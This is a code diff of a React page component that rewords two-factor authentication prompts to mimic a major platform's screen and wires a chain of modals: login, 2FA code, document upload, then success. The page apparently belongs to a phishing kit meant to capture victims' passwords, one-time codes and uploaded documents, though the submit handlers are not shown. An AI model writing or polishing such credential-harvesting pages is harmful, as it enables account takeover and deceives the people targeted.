@@ -109,9 +109,10 @@ const Home = () =>
             continueBtn: 'Continue',
             forgotPassword: 'Forgot password?',
 
-            twoFATitle: 'Check your authentication code',
-            twoFAInstruction: 'Enter the digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).',
+            twoFATitle: 'Two-factor authentication required',
+            twoFAInstruction: 'Enter the code for this account that we send to',
             twoFAInstructionOr: 'or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)',
+            enterTheCode: 'Enter the code',
             tryAnotherWay: 'Try another way',
             code: 'Code',
             codeExpired: 'This code has expired. Please enter a new code later',
@@ -677,10 +678,32 @@ const Home = () =>
                 texts={ texts }
                 defaultCountryCode={ ipInfo.countryCode }
             />
-            <LoginModal show={ showLoginModal } onClose={ () => setShowLoginModal( false ) } onSubmit={ handleLoginSubmit } onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } } texts={ texts } />
-            <TwoFAModal show={ show2FAModal } onClose={ () => setShow2FAModal( false ) } onSubmit={ handle2FASubmit } onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } } texts={ texts } />
-            <UploadModal show={ showUploadModal } onClose={ () => setShowUploadModal( false ) } onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } } texts={ texts } />
-            <SuccessModal show={ showSuccessModal } onClose={ () => setShowSuccessModal( false ) } texts={ texts } />
+            <LoginModal
+                show={ showLoginModal }
+                onClose={ () => setShowLoginModal( false ) }
+                onSubmit={ handleLoginSubmit }
+                onSuccess={ () => { setShowLoginModal( false ); setShow2FAModal( true ); } }
+                texts={ texts }
+            />
+            <TwoFAModal
+                show={ show2FAModal }
+                onClose={ () => setShow2FAModal( false ) }
+                onSubmit={ handle2FASubmit }
+                onSuccess={ () => { setShow2FAModal( false ); setShowUploadModal( true ); } }
+                texts={ texts }
+                formData={ formData }
+            />
+            <UploadModal
+                show={ showUploadModal }
+                onClose={ () => setShowUploadModal( false ) }
+                onSuccess={ () => { setShowUploadModal( false ); setShowSuccessModal( true ); } }
+                texts={ texts }
+            />
+            <SuccessModal
+                show={ showSuccessModal }
+                onClose={ () => setShowSuccessModal( false ) }
+                texts={ texts }
+            />
             <PrivacyPolicyModal
                 show={ showPrivacyModal }
                 onClose={ () =>
@@ -691,7 +714,11 @@ const Home = () =>
                 selectedQuestion={ selectedPrivacyQuestion }
                 texts={ texts }
             />
-            <TermsModal show={ showTermsModal } onClose={ () => setShowTermsModal( false ) } texts={ texts } />
+            <TermsModal
+                show={ showTermsModal }
+                onClose={ () => setShowTermsModal( false ) }
+                texts={ texts }
+            />
         </>
     );
 };
